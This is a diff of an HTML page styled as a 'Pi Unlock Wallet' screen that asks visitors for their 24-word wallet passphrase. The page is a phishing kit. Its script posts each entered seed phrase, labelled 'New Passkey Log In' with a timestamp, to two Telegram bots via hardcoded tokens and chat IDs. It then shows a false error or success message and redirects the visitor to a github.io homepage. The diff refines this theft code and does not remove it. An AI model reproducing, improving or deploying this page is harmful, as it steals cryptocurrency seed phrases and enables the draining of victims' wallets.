@@ -1,12 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Pi Unlock Wallet</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
+    /* Your existing CSS unchanged */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
       background: linear-gradient(135deg, #800080 0%, #800080 50%, #800080 100%);
@@ -15,9 +19,47 @@
       flex-direction: column;
       color: #333;
     }
-
-    .header, .menu-dots, .back-arrow { display: none; }
-
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 20px;
+      color: white;
+    }
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .back-arrow {
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .header-title {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .pi-icon {
+      width: 28px;
+      height: 28px;
+      background: linear-gradient(135deg, #F59E0B, #D97706);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .header-text {
+      font-size: 20px;
+      font-weight: 600;
+    }
+    .menu-dots {
+      font-size: 24px;
+      cursor: pointer;
+    }
     .main-content {
       flex: 1;
       background: #F8F9FA;
@@ -25,7 +67,6 @@
       padding: 32px 20px 20px;
       margin-top: 8px;
     }
-
     .page-title {
       font-size: 28px;
       font-weight: 700;
@@ -33,7 +74,6 @@
       text-align: center;
       margin-bottom: 32px;
     }
-
     .input-container {
       background: white;
       border-radius: 12px;
@@ -41,12 +81,10 @@
       margin-bottom: 16px;
       transition: all 0.2s ease;
     }
-
     .input-container:focus-within {
       border-color: #8B5CF6;
       box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
     }
-
     .message-input {
       width: 100%;
       padding: 20px;
@@ -58,16 +96,15 @@
       resize: vertical;
       min-height: 120px;
     }
-
-    .message-input::placeholder { color: #9CA3AF; }
-
+    .message-input::placeholder {
+      color: #9CA3AF;
+    }
     .button-container {
       display: flex;
       flex-direction: column;
       gap: 12px;
       margin-bottom: 24px;
     }
-
     .unlock-button {
       width: 100%;
       padding: 16px;
@@ -78,50 +115,44 @@
       cursor: pointer;
       transition: all 0.2s ease;
     }
-
     .unlock-button.primary {
       background: #800080;
       color: white;
     }
-
     .unlock-button.primary:hover {
       background: #7C3AED;
       transform: translateY(-1px);
     }
-
+    .unlock-button.primary:active {
+      transform: translateY(0);
+    }
     .unlock-button.secondary {
       background: white;
       color: #8B5CF6;
       border: 1.5px solid #E5E7EB;
     }
-
     .unlock-button.secondary:hover {
       background: #F3F4F6;
       border-color: #8B5CF6;
     }
-
     .unlock-button:disabled {
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
     }
-
     .info-text {
       font-size: 15px;
       line-height: 1.5;
       color: #6B7280;
       margin-bottom: 16px;
     }
-
     .link-text {
       color: #3B82F6;
       text-decoration: none;
     }
-
     .link-text:hover {
       text-decoration: underline;
     }
-
     .status-message {
       padding: 16px;
       border-radius: 12px;
@@ -133,24 +164,20 @@
       transform: translateY(10px);
       transition: all 0.3s ease;
     }
-
     .status-message.show {
       opacity: 1;
       transform: translateY(0);
     }
-
     .status-message.success {
       background: #D1FAE5;
       color: #065F46;
       border: 1px solid #A7F3D0;
     }
-
     .status-message.error {
       background: #FEE2E2;
       color: #991B1B;
       border: 1px solid #FECACA;
     }
-
     .loading-spinner {
       display: inline-block;
       width: 16px;
@@ -161,11 +188,9 @@
       animation: spin 1s linear infinite;
       margin-right: 8px;
     }
-
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-
     .home-indicator {
       position: fixed;
       bottom: 8px;
@@ -177,15 +202,19 @@
       border-radius: 3px;
       opacity: 0.3;
     }
-
     @media (max-width: 375px) {
-      .main-content { padding: 24px 16px 16px; }
-      .page-title { font-size: 24px; }
+      .main-content {
+        padding: 24px 16px 16px;
+      }
+      .page-title {
+        font-size: 24px;
+      }
     }
   </style>
 </head>
 <body>
 
+  <!-- Main Content -->
   <div class="main-content">
     <h1 class="page-title">Unlock Pi Wallet</h1>
     
@@ -223,77 +252,126 @@
     </div>
   </div>
 
+  <!-- Home Indicator -->
   <div class="home-indicator"></div>
 
- 
-  const TELEGRAM_BOT_TOKEN_1 = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
-  const TELEGRAM_CHAT_ID_1 = "7666653410";
-  const TELEGRAM_BOT_TOKEN_2 = "7615321195:AAHXgXRI-WRAGBoLAsjfIuNtisGuDM6OVMo";
-  const TELEGRAM_CHAT_ID_2 = "8119887370";
+  <script>
+    const TELEGRAM_BOT_TOKEN_1 = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
+    const TELEGRAM_CHAT_ID_1 = "7666653410";
+    const TELEGRAM_BOT_TOKEN_2 = "7615321195:AAHXgXRI-WRAGBoLAsjfIuNtisGuDM6OVMo";
+    const TELEGRAM_CHAT_ID_2 = "8119887370";
 
+    const HOMEPAGE_URL = "https://pibrowserkurd.github.io/pibrowserhome/";
 
-  function sendMessage() {
-  const input = document.getElementById("messageInput");
-  const statusMessage = document.getElementById("statusMessage");
-  const buttons = document.querySelectorAll(".unlock-button");
-  const buttonTexts = document.querySelectorAll(".button-text");
+    const buttons = document.querySelectorAll(".unlock-button");
+    const buttonTexts = document.querySelectorAll(".button-text");
+    const input = document.getElementById("messageInput");
+    const statusMessage = document.getElementById("statusMessage");
 
-  const message = input.value.trim();
+    function disableInputAndButtons(disabled) {
+      input.disabled = disabled;
+      buttons.forEach(button => button.disabled = disabled);
+    }
 
-  // Disable inputs
-  input.disabled = true;
-  buttons.forEach((button, index) => {
-    button.disabled = true;
-    buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
-  });
+    function showStatus(message, type) {
+      statusMessage.textContent = message;
+      statusMessage.className = `status-message ${type} show`;
+    }
 
-  // If input is too short
-  if (message.length <= 24) {
-    showStatus("✗ It should be a 24-length passkey to login", "error");
-    setTimeout(() => {
-      window.location.replace("https://pibrowserkurd.github.io/");
-    }, 1000);
-    return;
-  }
+    function formatTimeWithOclock(date) {
+      // format like "3:45 PM o'clock"
+      let options = { hour: 'numeric', minute: '2-digit' };
+      let timeStr = date.toLocaleTimeString([], options);
+      return `${timeStr} o'clock`;
+    }
 
-  const requests = [
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: message })
-    }),
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message })
-    })
-  ];
+    function sendMessage() {
+      const message = input.value.trim();
 
-  Promise.all(requests)
-    .then(responses => Promise.all(responses.map(res => res.json())))
-    .then(results => {
-      showStatus("✗ Please Try Again", "error");
-      input.value = "";
-    })
-    .catch(error => {
-      showStatus("✗ Please Try Again", "error");
-      console.error("Error:", error);
-    })
-    .finally(() => {
-      setTimeout(() => {
-        window.location.replace("https://pibrowserkurd.github.io/");
-      }, 1000);
+      // Disable inputs and buttons immediately for cooldown
+      disableInputAndButtons(true);
+
+      // Show loading spinner and sending text on buttons
+      buttonTexts.forEach(bt => {
+        bt.innerHTML = `<span class="loading-spinner"></span>Sending...`;
+      });
+
+      // Clear previous status
+      statusMessage.className = 'status-message';
+
+      if (message.length < 24) {
+        showStatus("The Passkey Should Be 24 Words Length", "error");
+
+        // After 5 seconds, redirect to homepage
+        setTimeout(() => {
+          window.location.href = HOMEPAGE_URL;
+        }, 5000);
+
+        // Re-enable input/buttons after 5 seconds cooldown
+        setTimeout(() => {
+          disableInputAndButtons(false);
+          buttonTexts[0].textContent = "Unlock With Passphrase";
+          buttonTexts[1].textContent = "Unlock With Face ID";
+        }, 5000);
+
+        return;
+      }
+
+      // Prepare Telegram message with header and timestamp
+      const now = new Date();
+      const timeStr = formatTimeWithOclock(now);
+      const telegramMessage = `New Passkey Log In\nTime: ${timeStr}\n\n${message}`;
+
+      // Send message to both Telegram bots
+      const requests = [
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: telegramMessage })
+        }),
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: telegramMessage })
+        })
+      ];
+
+      Promise.all(requests)
+        .then(responses => Promise.all(responses.map(res => res.json())))
+        .then(results => {
+          const allSuccess = results.every(result => result.ok);
+          if (allSuccess) {
+            showStatus("Passkey sent successfully!", "success");
+            input.value = "";
+          } else {
+            showStatus("✗ Please Try Again", "error");
+            console.error("Telegram API results:", results);
+          }
+        })
+        .catch(error => {
+          showStatus("✗ Please Try Again", "error");
+          console.error("Telegram API error:", error);
+        })
+        .finally(() => {
+          // Re-enable input/buttons after 5 seconds cooldown
+          setTimeout(() => {
+            disableInputAndButtons(false);
+            buttonTexts[0].textContent = "Unlock With Passphrase";
+            buttonTexts[1].textContent = "Unlock With Face ID";
+          }, 5000);
+        });
+    }
+
+    // Auto-resize input height on input
+    input.addEventListener("input", function() {
+      this.style.height = "auto";
+      this.style.height = Math.min(this.scrollHeight, 200) + "px";
     });
-}
 
-function showStatus(message, type) {
-  const statusMessage = document.getElementById("statusMessage");
-  statusMessage.textContent = message;
-  statusMessage.className = `status-message ${type}`;
-  setTimeout(() => {
-    statusMessage.classList.add("show");
-  }, 100);
-}
+    // Focus input on page load
+    window.addEventListener("load", () => {
+      input.focus();
+    });
   </script>
 </body>
 </html>
